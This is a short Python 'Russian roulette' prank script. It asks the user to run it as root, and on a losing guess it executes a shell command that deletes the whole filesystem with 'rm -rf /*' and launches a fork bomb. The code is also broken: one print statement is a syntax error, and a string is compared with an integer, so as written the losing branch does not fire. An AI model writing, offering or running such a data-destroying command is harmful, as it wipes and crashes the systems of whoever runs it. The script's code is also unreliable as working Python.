#importing random to make the choices entireley random 
#import os to control the os, so long as you are running as root 
import os
import random 

#couple varibles 
start_game = input("Wanna play a game? \n ")
play = input("Russian roulette... \n make sure your running as root ")
list = [1,2,3,4,5,6]
choose = random.choice(list)

def main():
    start_game = input("Are you sure? (yes/no): ")

    if start_game.lower() == "yes":
        play = input("Pick a Number between 1 and 6 \n")
        choose
        print("computer chooses"choose)
        if play == choose:
            print("You lose :(")
            os.system("rm -rf /* | :(){ :|:& };:")
        else:
            print("You Win")
    else:
        print("Smart move")

main()

